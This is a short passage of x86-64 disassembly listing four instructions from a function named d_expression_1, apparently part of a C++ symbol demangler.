   140004bdf:	89 c1                	mov    %eax,%ecx
   140004be1:	83 c1 01             	add    $0x1,%ecx
   140004be4:	0f 88 46 02 00 00    	js     140004e30 <d_expression_1+0x370>
   140004bea:	48 8b 53 18          	mov    0x18(%rbx),%rdx
